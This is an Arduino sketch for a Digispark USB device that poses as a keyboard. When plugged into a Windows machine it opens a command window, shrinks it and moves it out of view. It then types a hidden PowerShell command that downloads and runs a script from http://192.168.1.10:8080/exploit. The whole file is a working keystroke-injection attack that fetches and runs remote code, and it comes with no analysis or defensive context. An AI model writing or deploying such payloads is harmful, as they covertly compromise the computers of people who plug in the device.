#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(60);
  DigiKeyboard.println("CMD  /q /d /f:off /v:on /k MODE con: cols=30 lines=6");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(60);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_SPACE);
  delay(60);
  DigiKeyboard.print("m");
  DigiKeyboard.sendKeyPress(KEY_LEFT_ARROW);
  delay(3000);
  DigiKeyboard.sendKeyPress(0);
  delay(60);
  DigiKeyboard.println("notepad");
  delay(60);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.println("powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $c.downloadstring('http://192.168.1.10:8080/exploit');");
  }


void loop() {

}
